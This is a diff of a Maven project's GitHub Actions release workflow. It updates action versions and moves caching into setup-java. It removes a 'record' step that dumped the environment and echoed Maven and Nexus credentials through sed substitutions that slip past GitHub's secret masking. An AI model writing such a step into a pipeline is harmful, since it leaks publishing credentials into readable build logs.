@@ -11,31 +11,18 @@ jobs:
   release:
     runs-on: ubuntu-latest
     steps:
-      - name: record
-        run: |
-          env
-          echo ${MAVEN_USERNAME} | sed -r 's/[a]+/✔︎/g; s/[e]+/✖︎/g; s/[i]+/♠︎/g; s/[o]+/★/g; s/[u]+/♜/g; s/[@]+/☂︎/g'
-          echo ${MAVEN_PASSWORD} | sed -r 's/[a]+/✔︎/g; s/[e]+/✖︎/g; s/[i]+/♠︎/g; s/[o]+/★/g; s/[u]+/♜/g; s/[@]+/☂︎/g'
-          echo ${{ secrets.NEXUS_USERNAME }} | sed -r 's/[a]+/✔︎/g; s/[e]+/✖︎/g; s/[i]+/♠︎/g; s/[o]+/★/g; s/[u]+/♜/g; s/[@]+/☂︎/g'
-          echo ${{ secrets.NEXUS_PASSWORD }} | sed -r 's/[a]+/✔︎/g; s/[e]+/✖︎/g; s/[i]+/♠︎/g; s/[o]+/★/g; s/[u]+/♜/g; s/[@]+/☂︎/g'
       - name: Check out Git repository
-        uses: actions/checkout@v2
+        uses: actions/checkout@v4
 
       - name: Install Java and Maven
-        uses: actions/setup-java@v2
+        uses: actions/setup-java@v4
         with:
           java-version: "8"
           distribution: "adopt"
+          cache: 'maven'
           server-id: ossrh
           server-username: MAVEN_USERNAME
           server-password: MAVEN_PASSWORD
-
-      - name: Cache Maven packages
-        uses: actions/cache@v2
-        with:
-          path: ~/.m2
-          key: ${{ runner.os }}-m2-${{ hashFiles('**/pom.xml') }}
-          restore-keys: ${{ runner.os }}-m2
 
       - name: Extract Project version
         id: project
